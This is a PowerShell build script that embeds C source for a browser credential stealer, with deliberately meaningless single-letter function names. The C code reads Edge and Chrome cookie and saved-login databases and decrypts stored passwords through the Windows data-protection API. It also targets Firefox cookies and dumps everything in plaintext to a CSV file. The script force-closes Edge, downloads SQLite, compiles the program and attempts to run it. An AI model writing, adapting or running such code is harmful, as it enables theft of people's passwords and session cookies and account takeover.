# Define the URL for the SQLite amalgamation ZIP file
$headerUrl = "https://www.sqlite.org/2024/sqlite-amalgamation-3470000.zip"
$headerZipPath = "$env:TEMP\sqlite-amalgamation.zip"
$w64devkitPath = "C:\C\w64devkit"

# Define the C code
$cCode = @"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include "sqlite3.h"

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0500
#endif

void a(char *b) {
    while (*b) {
        *b = *b ^ 0xAA;
        b++;
    }
}

void c(FILE *d, const char *e, const char *f, const char *g, const char *h) {
    fprintf(d, "%s,%s,%s,%s\n", e, f, g, h);
    printf("Writing to CSV: %s, %s, %s, %s\n", e, f, g, h);
}

char* i(const void *j, int k) {
    DATA_BLOB l, m;
    l.pbData = (BYTE *)j;
    l.cbData = k;

    if (CryptUnprotectData(&l, NULL, NULL, NULL, NULL, 0, &m)) {
        char *n = (char *)malloc(m.cbData + 1);
        memcpy(n, m.pbData, m.cbData);
        n[m.cbData] = '\0';
        LocalFree(m.pbData);
        return n;
    } else {
        fprintf(stderr, "Failed to decrypt password\n");
        return NULL;
    }
}

void o(sqlite3 *p, FILE *d) {
    sqlite3_stmt *q;
    const char *r = "SELECT host_key, name, value FROM cookies";
    int s = sqlite3_prepare_v2(p, r, -1, &q, 0);

    if (s != SQLITE_OK) {
        fprintf(stderr, "Failed to fetch cookies: %s\n", sqlite3_errmsg(p));
        return;
    }

    while (sqlite3_step(q) == SQLITE_ROW) {
        const char *t = (const char *)sqlite3_column_text(q, 0);
        const char *u = (const char *)sqlite3_column_text(q, 1);
        const char *v = (const char *)sqlite3_column_text(q, 2);
        printf("Read cookie: %s, %s, %s\n", t, u, v);
        c(d, "Cookie", t, u, v);
    }

    sqlite3_finalize(q);
}

void w(sqlite3 *p, FILE *d) {
    sqlite3_stmt *q;
    const char *r = "SELECT origin_url, username_value, password_value FROM logins";
    int s = sqlite3_prepare_v2(p, r, -1, &q, 0);

    if (s != SQLITE_OK) {
        fprintf(stderr, "Failed to fetch passwords: %s\n", sqlite3_errmsg(p));
        return;
    }

    while (sqlite3_step(q) == SQLITE_ROW) {
        const char *x = (const char *)sqlite3_column_text(q, 0);
        const char *y = (const char *)sqlite3_column_text(q, 1);
        const void *z = sqlite3_column_blob(q, 2);
        int aa = sqlite3_column_bytes(q, 2);

        char *ab = i(z, aa);
        if (ab) {
            printf("Read password: %s, %s, %s\n", x, y, ab);
            c(d, "Password", x, y, ab);
            free(ab);
        }
    }

    sqlite3_finalize(q);
}

void ac(sqlite3 *p) {
    sqlite3_stmt *q;
    const char *r = "SELECT name FROM sqlite_master WHERE type='table'";
    int s = sqlite3_prepare_v2(p, r, -1, &q, 0);

    if (s != SQLITE_OK) {
        fprintf(stderr, "Failed to inspect schema: %s\n", sqlite3_errmsg(p));
        return;
    }

    printf("Tables in the database:\n");
    while (sqlite3_step(q) == SQLITE_ROW) {
        printf("%s\n", sqlite3_column_text(q, 0));
    }

    sqlite3_finalize(q);
}

void ad(const char *ae, void (*af)(sqlite3 *, FILE *), FILE *d) {
    sqlite3 *p;
    int s = sqlite3_open(ae, &p);

    if (s != SQLITE_OK) {
        fprintf(stderr, "Cannot open database %s: %s\n", ae, sqlite3_errmsg(p));
        return;
    }

    printf("Reading database: %s\n", ae);
    ac(p); // Inspect the schema before reading
    af(p, d);
    sqlite3_close(p);
}

void ag(char *ah, size_t ai) {
    char aj[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, aj))) {
        snprintf(ah, ai, "%s\\Mozilla\\Firefox\\Profiles", aj);
    }
}

int main() {
    char ak[MAX_PATH];
    char al[MAX_PATH];
    char am[MAX_PATH];
    char an[MAX_PATH];
    char ao[MAX_PATH];
    char ap[MAX_PATH];

    // Get paths for Edge
    snprintf(ak, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
    snprintf(al, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));

    // Get paths for Chrome
    snprintf(am, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
    snprintf(an, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));

    // Get path for Firefox profile
    ag(ao, MAX_PATH);
    snprintf(ap, MAX_PATH, "%s\\<profile>\\cookies.sqlite", ao); // Replace <profile> with actual profile name

    // Print paths for verification
    printf("Edge cookies path: %s\n", ak);
    printf("Edge passwords path: %s\n", al);
    printf("Chrome cookies path: %s\n", am);
    printf("Chrome passwords path: %s\n", an);
    printf("Firefox cookies path: %s\n", ap);

    FILE *d = fopen("output.csv", "w");
    if (!d) {
        fprintf(stderr, "Cannot open output.csv for writing\n");
        return 1;
    }

    fprintf(d, "Type,Column1,Column2,Column3\n");

    printf("Reading Edge cookies and passwords...\n");
    ad(ak, o, d);
    ad(al, w, d);

    printf("Reading Chrome cookies and passwords...\n");
    ad(am, o, d);
    ad(an, w, d);

    printf("Reading Firefox cookies...\n");
    ad(ap, o, d);

    fclose(d);

    return 0;
}
"@

# Stop Edge process and wait until it ends
Write-Output "Stopping Edge process..."
Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
Write-Output "Waiting for Edge process to exit..."
Wait-Process -Name "msedge" -ErrorAction SilentlyContinue

# Download the SQLite amalgamation ZIP file
Write-Output "Downloading SQLite amalgamation..."
Invoke-WebRequest -Uri $headerUrl -OutFile $headerZipPath

# Extract the SQLite amalgamation ZIP file
Write-Output "Extracting SQLite amalgamation..."
Expand-Archive -Path $headerZipPath -DestinationPath $env:TEMP -Force

# Create include directory if it doesn't exist
if (-Not (Test-Path "$w64devkitPath\include")) {
    New-Item -ItemType Directory -Path "$w64devkitPath\include"
}

# Copy sqlite3.h and sqlite3.c to the w64devkit include directory
Write-Output "Copying sqlite3.h and sqlite3.c to w64devkit include directory..."
Copy-Item -Path "$env:TEMP\sqlite-amalgamation-3470000\sqlite3.h" -Destination "$w64devkitPath\include"
Copy-Item -Path "$env:TEMP\sqlite-amalgamation-3470000\sqlite3.c" -Destination "$w64devkitPath\include"

# Clean up downloaded files
Remove-Item -Path $headerZipPath

# Write the C code to a file
$cFilePath = "$env:TEMP\read_browser_data.c"
Set-Content -Path $cFilePath -Value $cCode

# Set PATH environment variable to include w64devkit bin directory
$env:Path += ";$w64devkitPath\bin"

# Compile the C code using w64devkit GCC
Write-Output "Compiling the C code..."
& "$w64devkitPath\bin\gcc.exe" -o "$env:TEMP\read_browser_data.exe" $cFilePath "$w64devkitPath\include\sqlite3.c" -I"$w64devkitPath\include" -L"$w64devkitPath\lib" -lShell32

Write-Output "Compilation completed successfully!"

# Execute the compiled executable
Write-Output "Executing the compiled program..." & "$env:TEMP\read_browser_data.exe"

Write-Output "Execution completed. Check output.csv for results."
